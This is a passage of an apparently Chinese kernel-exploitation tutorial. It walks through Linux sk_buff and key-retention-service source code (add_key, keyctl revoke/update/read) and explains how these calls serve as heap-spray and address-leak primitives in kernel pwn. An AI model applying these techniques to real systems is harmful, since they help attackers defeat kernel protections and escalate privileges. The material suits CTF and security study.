<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Free an skbuff by memory without cleaning the state.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">kfree_skbmem</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_fclones</span> *<span class="title">fclones</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (skb-&gt;fclone) &#123;</span><br><span class="line">	<span class="keyword">case</span> SKB_FCLONE_UNAVAILABLE:</span><br><span class="line">		kmem_cache_free(skbuff_head_cache, skb);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> SKB_FCLONE_ORIG:</span><br><span class="line">		fclones = container_of(skb, <span class="keyword">struct</span> sk_buff_fclones, skb1);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* We usually free the clone (TX completion) before original skb</span></span><br><span class="line"><span class="comment">		 * This test would have no chance to be true for the clone,</span></span><br><span class="line"><span class="comment">		 * while here, branch prediction will be good.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (refcount_read(&amp;fclones-&gt;fclone_ref) == <span class="number">1</span>)</span><br><span class="line">			<span class="keyword">goto</span> fastpath;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">default</span>: <span class="comment">/* SKB_FCLONE_CLONE */</span></span><br><span class="line">		fclones = container_of(skb, <span class="keyword">struct</span> sk_buff_fclones, skb2);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!refcount_dec_and_test(&amp;fclones-&gt;fclone_ref))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">fastpath:</span><br><span class="line">	kmem_cache_free(skbuff_fclone_cache, fclones);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>从这里我们也可以看出 <code>sk_buff</code>
结构体也为我们提供了一个简陋的“菜单堆”功能，比较朴素的利用方式就是利用
<code>socketpair</code>
系统调用创建一对套接字，往其中一端写入以完成发包，从另一端读出以完成收包。</p>
<h1 id="内核密钥管理内核中的菜单堆">内核密钥管理：内核中的“菜单堆”</h1>
<p>自 Linux 2.6 起内核引入了 <strong>密钥保留服务</strong>（<strong>key
retention
service</strong>），用以在内核空间存储密钥以供其他服务使用，并提供了用以在用户空间操作密钥的三个新的系统调用，我们这里仅关注
type 为 <code>"user"</code> 的密钥</p>
<h2
id="add_key---创建带描述密钥gfp_kernel-__gfp_hardwall-__gfp_nowarn">add_key
- 创建带描述密钥（GFP_KERNEL | __GFP_HARDWALL | __GFP_NOWARN）</h2>
<p><code>add_key()</code> 系统调用用以创建或更新带有给定
<code>type</code> 与 <code>description</code> 的密钥，并以长为
<code>plen</code> 的 <code>payload</code> 以实例化，之后将其挂到指定的
<code>keyring</code> 上并返回一个代表密钥的序列号：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">key_serial_t</span> <span class="title function_">add_key</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *type, <span class="type">const</span> <span class="type">char</span> *description,</span></span><br><span class="line"><span class="params">                            <span class="type">const</span> <span class="type">void</span> *payload, <span class="type">size_t</span> plen,</span></span><br><span class="line"><span class="params">                            <span class="type">key_serial_t</span> keyring)</span>;</span><br></pre></td></tr></table></figure></div>
<p>这里我们主要关注这个功能如何被利用在 kernel pwn 当中，这里先给 pwner
视角下该函数的简要流程：</p>
<ul>
<li>首先会在内核空间中分配 obj1 与 obj2，分配 flag 为
<code>GFP_KERNEL</code>，用以保存 <code>description</code>
（字符串，最大大小为 4096）、<code>payload</code>
（普通数据，大小无限制）</li>
<li>分配 obj3 保存 <code>description</code> ，分配 obj4 保存
<code>payload</code>，分配 flag 皆为 <code>GFP_KERNEL</code></li>
<li>释放 obj1 与 obj2，返回密钥 id</li>
</ul>
<p>现在我们来看具体过程，在 <code>add_key()</code> 系统调用中其会为
<code>decription</code> 与 <code>payload</code>
都分配对应大小的对象，并将数据拷贝到内核空间当中：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE5(add_key, <span class="type">const</span> <span class="type">char</span> __user *, _type,</span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> __user *, _description,</span><br><span class="line">		<span class="type">const</span> <span class="type">void</span> __user *, _payload,</span><br><span class="line">		<span class="type">size_t</span>, plen,</span><br><span class="line">		<span class="type">key_serial_t</span>, ringid)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">if</span> (_description) &#123;</span><br><span class="line">        <span class="comment">// 为 decription 分配对象并将数据拷贝到内核空间当中</span></span><br><span class="line">		description = strndup_user(_description, KEY_MAX_DESC_SIZE); </span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">if</span> (plen) &#123;</span><br><span class="line">		ret = -ENOMEM;</span><br><span class="line">        <span class="comment">// 为 payload 分配对象</span></span><br><span class="line">		payload = kvmalloc(plen, GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!payload)</span><br><span class="line">			<span class="keyword">goto</span> error2;</span><br><span class="line"></span><br><span class="line">		ret = -EFAULT;</span><br><span class="line">        <span class="comment">// 将 payload 数据拷贝到内核空间当中</span></span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(payload, _payload, plen) != <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> error3;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 再次为 decription 和 payload 分配对象</span></span><br><span class="line">	key_ref = key_create_or_update(keyring_ref, type, description,</span><br><span class="line">				       payload, plen, KEY_PERM_UNDEF,</span><br><span class="line">				       KEY_ALLOC_IN_QUOTA);</span><br><span class="line">    ...</span><br><span class="line"> error3:</span><br><span class="line">	<span class="keyword">if</span> (payload) &#123;</span><br><span class="line">		memzero_explicit(payload, plen);</span><br><span class="line">        <span class="comment">// 释放第一次分配的 payload</span></span><br><span class="line">		kvfree(payload);</span><br><span class="line">	&#125;</span><br><span class="line"> error2:</span><br><span class="line">    <span class="comment">// 释放第一次分配的 description</span></span><br><span class="line">	kfree(description);</span><br><span class="line"> error:</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>拷贝 <code>description</code> 使用的是 <code>strndup_user()</code>
，可以看作 <code>kmalloc() + strcpy()</code>
的结合体，并限制了最大长度为
<code>KEY_MAX_DESC_SIZE</code>（4096），其核心是使用
<code>memdup_user()</code> 进行对象的分配与拷贝，使用的分配 flag 为
<code>GFP_USER | __GFP_NOWARN</code>，而 <code>GFP_USER</code>
其实等价于 <code>GFP_KERNEL | __GFP_HARDWALL</code> ：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">memdup_user</span><span class="params">(<span class="type">const</span> <span class="type">void</span> __user *src, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">void</span> *p;</span><br><span class="line"></span><br><span class="line">	p = kmalloc_track_caller(len, GFP_USER | __GFP_NOWARN);</span><br><span class="line">	<span class="keyword">if</span> (!p)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(p, src, len)) &#123;</span><br><span class="line">		kfree(p);</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-EFAULT);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(memdup_user);</span><br></pre></td></tr></table></figure></div>
<p>而 payload 的拷贝则更简单，直接使用
<code>kvmalloc(plen, GFP_KERNEL)</code> 分配 <code>plen</code>
大小的对象后使用 <code>copy_from_user()</code> 进行拷贝。</p>
<p>不过这两个对象都为<strong>临时对象</strong>，类似于
<code>setxattr</code> ，在 <code>add_key()</code>
系统调用结束时这两个用来存储数据的临时对象便会被释放掉。</p>
<p>但是实际上在 <code>add_key()</code> 调用的
<code>key_create_or_update()</code> 中还会进行第二次对象分配。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">key_ref_t</span> <span class="title function_">key_create_or_update</span><span class="params">(<span class="type">key_ref_t</span> keyring_ref,</span></span><br><span class="line"><span class="params">			       <span class="type">const</span> <span class="type">char</span> *type,</span></span><br><span class="line"><span class="params">			       <span class="type">const</span> <span class="type">char</span> *description,</span></span><br><span class="line"><span class="params">			       <span class="type">const</span> <span class="type">void</span> *payload,</span></span><br><span class="line"><span class="params">			       <span class="type">size_t</span> plen,</span></span><br><span class="line"><span class="params">			       <span class="type">key_perm_t</span> perm,</span></span><br><span class="line"><span class="params">			       <span class="type">unsigned</span> <span class="type">long</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">keyring_index_key</span> <span class="title">index_key</span> =</span> &#123;</span><br><span class="line">		.description	= description,</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key_preparsed_payload</span> <span class="title">prep</span>;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="built_in">memset</span>(&amp;prep, <span class="number">0</span>, <span class="keyword">sizeof</span>(prep));</span><br><span class="line">	prep.data = payload;</span><br><span class="line">	prep.datalen = plen;</span><br><span class="line">	prep.quotalen = index_key.type-&gt;def_datalen;</span><br><span class="line">	prep.expiry = TIME64_MAX;</span><br><span class="line">	<span class="keyword">if</span> (index_key.type-&gt;preparse) &#123;</span><br><span class="line">        <span class="comment">// 再次为 payload 分配对象</span></span><br><span class="line">		ret = index_key.type-&gt;preparse(&amp;prep);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 为 key 分配对象并再次为 description 分配对象</span></span><br><span class="line">	key = key_alloc(index_key.type, index_key.description,</span><br><span class="line">			cred-&gt;fsuid, cred-&gt;fsgid, cred, perm, flags, <span class="literal">NULL</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// user_key_payload 存储到 key </span></span><br><span class="line">	ret = __key_instantiate_and_link(key, &amp;prep, keyring, <span class="literal">NULL</span>, &amp;edit);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里的 <code>index_key.type</code> 根据我们传进来的 <code>type</code>
参数决定，对于 <code>"user"</code> 而言该函数表应当为
<code>key_type_user</code>：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> <span class="title">key_type_user</span> =</span> &#123;</span><br><span class="line">	.name			= <span class="string">&quot;user&quot;</span>,</span><br><span class="line">	.preparse		= user_preparse,</span><br><span class="line">	.free_preparse		= user_free_preparse,</span><br><span class="line">	.instantiate		= generic_key_instantiate,</span><br><span class="line">	.update			= user_update,</span><br><span class="line">	.revoke			= user_revoke,</span><br><span class="line">	.destroy		= user_destroy,</span><br><span class="line">	.describe		= user_describe,</span><br><span class="line">	.read			= user_read,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>因此被调用的函数为 <code>user_preparse</code> ，其会为我们的
<code>payload</code> 再分配一个带有一个 <code>user_key_payload</code>
结构体作为头部的对象来保存我们传入的 <code>payload</code> ，分配 flag 为
<code>GFP_KERNEL</code>：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">user_preparse</span><span class="params">(<span class="keyword">struct</span> key_preparsed_payload *prep)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> *<span class="title">upayload</span>;</span></span><br><span class="line">	<span class="type">size_t</span> datalen = prep-&gt;datalen;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (datalen &lt;= <span class="number">0</span> || datalen &gt; <span class="number">32767</span> || !prep-&gt;data)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	upayload = kmalloc(<span class="keyword">sizeof</span>(*upayload) + datalen, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!upayload)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* attach the data */</span></span><br><span class="line">	prep-&gt;quotalen = datalen;</span><br><span class="line">	prep-&gt;payload.data[<span class="number">0</span>] = upayload;</span><br><span class="line">	upayload-&gt;datalen = datalen;</span><br><span class="line">	<span class="built_in">memcpy</span>(upayload-&gt;data, prep-&gt;data, datalen);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>user_key_payload</code> 的定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU destructor */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span>	datalen;	<span class="comment">/* length of this data */</span></span><br><span class="line">	<span class="type">char</span>		data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>rcu_head</code> 的定义如下，即
<code>user_key_payload</code> 带有一个长度为 <code>0x18</code> 的
header：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure></div>
<p>在 <code>key_alloc()</code> 当中存在如下逻辑：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> key *<span class="title function_">key_alloc</span><span class="params">(<span class="keyword">struct</span> key_type *type, <span class="type">const</span> <span class="type">char</span> *desc,</span></span><br><span class="line"><span class="params">		      <span class="type">kuid_t</span> uid, <span class="type">kgid_t</span> gid, <span class="type">const</span> <span class="keyword">struct</span> cred *cred,</span></span><br><span class="line"><span class="params">		      <span class="type">key_perm_t</span> perm, <span class="type">unsigned</span> <span class="type">long</span> flags,</span></span><br><span class="line"><span class="params">		      <span class="keyword">struct</span> key_restriction *restrict_link)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	desclen = <span class="built_in">strlen</span>(desc);</span><br><span class="line">	quotalen = desclen + <span class="number">1</span> + type-&gt;def_datalen;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* allocate and initialise the key and its description */</span></span><br><span class="line">	key = kmem_cache_zalloc(key_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!key)</span><br><span class="line">		<span class="keyword">goto</span> no_memory_2;</span><br><span class="line"></span><br><span class="line">	key-&gt;index_key.desc_len = desclen;</span><br><span class="line">	key-&gt;index_key.description = kmemdup(desc, desclen + <span class="number">1</span>, GFP_KERNEL);</span><br></pre></td></tr></table></figure></div>
<p>在该函数中会完成代表单个密钥的 <code>key</code> 结构体与
<code>description</code> 空间的分配，其中 <code>key</code>
结构体来自独立的 <code>key_jar</code>，这里我们暂且不关注，而
<code>description</code> 的空间则使用 <code>kmemdup()</code>
进行分配，该函数本质上等于
<code>slab_alloc_node() + memcpy()</code>，可以直接理解为使用
<code>kmalloc(size, GFP_KERNEL)</code>
分配了一个内核对象并写入了一个字符串 <code>description</code> 。</p>
<p>后存在如下调用链将 <code>user_key_payload</code> 存储到 key 中：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sys_add_key()</span><br><span class="line">	key_create_or_update()</span><br><span class="line">        __key_instantiate_and_link()</span><br><span class="line">            key-&gt;type-&gt;instantiate(key, prep) // 对于 type &quot;user&quot; 而言为 generic_key_instantiate()</span><br></pre></td></tr></table></figure></div>
<h3 id="数据泄露-6">数据泄露</h3>
<ul>
<li><p>内核 .text 段地址</p>
<p><code>user_key_payload</code> 的 header 中带有一个函数指针，对于 type
为 <code>"user"</code> 的 key 而言在 payload
被<strong>释放</strong>时该指针会被赋值
<code>user_free_payload_rcu()</code>，因此我们可以通过释放掉一段 payload
后再通过其他方法读取 payload 内容的方式（例如通过其他的 payload
进行越界读取）来泄露内核 .text 段地址</p>
<p>但是有的版本内核的 <code>user_key_payload</code>
释放前会清空内存导致无法泄露内核基址。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">memzero_explicit</span><span class="params">(<span class="type">void</span> *s, <span class="type">size_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">memset</span>(s, <span class="number">0</span>, count);</span><br><span class="line">	barrier_data(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kfree_sensitive</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">size_t</span> ks;</span><br><span class="line">	<span class="type">void</span> *mem = (<span class="type">void</span> *)p;</span><br><span class="line"></span><br><span class="line">	ks = ksize(mem);</span><br><span class="line">	<span class="keyword">if</span> (ks)</span><br><span class="line">		memzero_explicit(mem, ks);</span><br><span class="line">	kfree(mem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p></li>
<li><p>内核”堆“上地址</p>
<p>通过 header中的 <code>next</code> 指针泄露</p></li>
</ul>
<h2 id="keyctl---密钥管理菜单堆操作">keyctl -
密钥管理：“菜单堆”操作</h2>
<p><code>keyctl()</code>
系统调用为我们提供了对内核中密钥的管理，其核心主要是一个巨大的
switch，类似于 ioctl，根据我们传入的不同的 option
进行不同的操作，我们主要关注以下几个：</p>
<h3 id="keyctl_revoke---释放-payload">KEYCTL_REVOKE - 释放 payload</h3>
<p>该选项对应调用的是 <code>keyctl_revoke_key()</code>，其中会调用到
<code>key_revoke()</code>，其中会调用
<code>key-&gt;type-&gt;revoke(key)</code>，对于 type 为
<code>"user"</code> 的 key 而言最后调用到
<code>user_revoke()</code>：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">user_revoke</span><span class="params">(<span class="keyword">struct</span> key *key)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> *<span class="title">upayload</span> =</span> user_key_payload_locked(key);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* clear the quota */</span></span><br><span class="line">	key_payload_reserve(key, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (upayload) &#123;</span><br><span class="line">		rcu_assign_keypointer(key, <span class="literal">NULL</span>);</span><br><span class="line">		call_rcu(&amp;upayload-&gt;rcu, user_free_payload_rcu);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里会通过 <code>call_rcu()</code> 调用到
<code>user_free_payload_rcu()</code>，将 payload 释放掉：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">user_free_payload_rcu</span><span class="params">(<span class="keyword">struct</span> rcu_head *head)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> *<span class="title">payload</span>;</span></span><br><span class="line"></span><br><span class="line">	payload = container_of(head, <span class="keyword">struct</span> user_key_payload, rcu);</span><br><span class="line">	kfree_sensitive(payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="keyctl_update---更新-payload-内容">KEYCTL_UPDATE - 更新 payload
内容</h3>
<p>该选项会调用到
<code>keyctl_update_key()</code>，首先会分配一个临时对象从用户空间拷贝数据，之后调用
<code>key_update()</code> 更新 payload，最后释放掉临时对象：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">keyctl_update_key</span><span class="params">(<span class="type">key_serial_t</span> id,</span></span><br><span class="line"><span class="params">		       <span class="type">const</span> <span class="type">void</span> __user *_payload,</span></span><br><span class="line"><span class="params">		       <span class="type">size_t</span> plen)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">key_ref_t</span> key_ref;</span><br><span class="line">	<span class="type">void</span> *payload;</span><br><span class="line">	<span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (plen &gt; PAGE_SIZE)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* pull the payload in if one was supplied */</span></span><br><span class="line">	payload = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (plen) &#123;</span><br><span class="line">		ret = -ENOMEM;</span><br><span class="line">		payload = kvmalloc(plen, GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!payload)</span><br><span class="line">			<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">		ret = -EFAULT;</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(payload, _payload, plen) != <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> error2;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* find the target key (which must be writable) */</span></span><br><span class="line">	key_ref = lookup_user_key(id, <span class="number">0</span>, KEY_NEED_WRITE);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(key_ref)) &#123;</span><br><span class="line">		ret = PTR_ERR(key_ref);</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* update the key */</span></span><br><span class="line">	ret = key_update(key_ref, payload, plen);</span><br><span class="line"></span><br><span class="line">	key_ref_put(key_ref);</span><br><span class="line">error2:</span><br><span class="line">	kvfree_sensitive(payload, plen);</span><br><span class="line">error:</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 <code>key_update()</code> 中会调用
<code>key-&gt;type-&gt;preparse(&amp;prep)</code> 分配新
<code>payload</code> 空间并进行数据拷贝，之后调用
<code>key-&gt;type-&gt;update(key, &amp;prep)</code> 更新
<code>payload</code> 并释放旧的 <code>payload</code> ，最后调用
<code>key-&gt;type-&gt;free_preparse(&amp;prep)</code>
来了一个“假动作”。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">key_update</span><span class="params">(<span class="type">key_ref_t</span> key_ref, <span class="type">const</span> <span class="type">void</span> *payload, <span class="type">size_t</span> plen)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(&amp;prep, <span class="number">0</span>, <span class="keyword">sizeof</span>(prep));</span><br><span class="line">	prep.data = payload;</span><br><span class="line">	prep.datalen = plen;</span><br><span class="line">	prep.quotalen = key-&gt;type-&gt;def_datalen;</span><br><span class="line">	prep.expiry = TIME64_MAX;</span><br><span class="line">	<span class="keyword">if</span> (key-&gt;type-&gt;preparse) &#123;</span><br><span class="line">		ret = key-&gt;type-&gt;preparse(&amp;prep);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	ret = key-&gt;type-&gt;update(key, &amp;prep);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (key-&gt;type-&gt;preparse)</span><br><span class="line">		key-&gt;type-&gt;free_preparse(&amp;prep);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>对于 type 为 <code>"user"</code> 而言 <code>preparse</code>
指针应当为 <code>user_preparse</code>，这个函数前面分析过，其会为我们的
<code>payload</code> 再分配一个带有一个 <code>user_key_payload</code>
结构体作为头部的对象来保存我们传入的 <code>payload</code> ，分配 flag 为
<code>GFP_KERNEL</code>。</p>
<p>对于 type 为 <code>"user"</code> 而言 <code>update</code> 指针应当为
<code>user_update</code>，主要就是将新的 <code>payload</code> 给到
key，调用 <code>user_free_payload_rcu()</code> 释放旧的
<code>payload</code> ：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">user_update</span><span class="params">(<span class="keyword">struct</span> key *key, <span class="keyword">struct</span> key_preparsed_payload *prep)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> *<span class="title">zap</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* check the quota and attach the new data */</span></span><br><span class="line">	ret = key_payload_reserve(key, prep-&gt;datalen);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* attach the new data, displacing the old */</span></span><br><span class="line">	key-&gt;expiry = prep-&gt;expiry;</span><br><span class="line">	<span class="keyword">if</span> (key_is_positive(key))</span><br><span class="line">		zap = dereference_key_locked(key);</span><br><span class="line">	rcu_assign_keypointer(key, prep-&gt;payload.data[<span class="number">0</span>]);</span><br><span class="line">	prep-&gt;payload.data[<span class="number">0</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (zap)</span><br><span class="line">		call_rcu(&amp;zap-&gt;rcu, user_free_payload_rcu);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>对于 type 为 <code>"user"</code> 而言 <code>free_preparse</code>
指针应当为
<code>user_free_preparse</code>，这里只是一个简单的释放操作，但传入的参数
<code>prep-&gt;payload.data[0]</code> 在 <code>user_update</code>
中已经被设为 NULL，所以这一步并没有实际作用。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Free a preparse of a user defined key payload</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">user_free_preparse</span><span class="params">(<span class="keyword">struct</span> key_preparsed_payload *prep)</span></span><br><span class="line">&#123;</span><br><span class="line">	kfree_sensitive(prep-&gt;payload.data[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="keyctl_read---读取-payload-内容">KEYCTL_READ - 读取 payload
内容</h3>
<p>该选项对应调用的是
<code>keyctl_read_key()</code>，首先会先分配一个临时对象，之后调用
<code>__keyctl_read_key()</code> 将 <code>payload</code>
拷贝到临时对象上，最后从临时对象上拷贝数据到用户空间后释放该临时对象：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">keyctl_read_key</span><span class="params">(<span class="type">key_serial_t</span> keyid, <span class="type">char</span> __user *buffer, <span class="type">size_t</span> buflen)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	key_data_len = (buflen &lt;= PAGE_SIZE) ? buflen : <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="keyword">if</span> (key_data_len) &#123;</span><br><span class="line">			key_data = kvmalloc(key_data_len, GFP_KERNEL);</span><br><span class="line">			<span class="keyword">if</span> (!key_data) &#123;</span><br><span class="line">				ret = -ENOMEM;</span><br><span class="line">				<span class="keyword">goto</span> key_put_out;</span><br><span class="line">			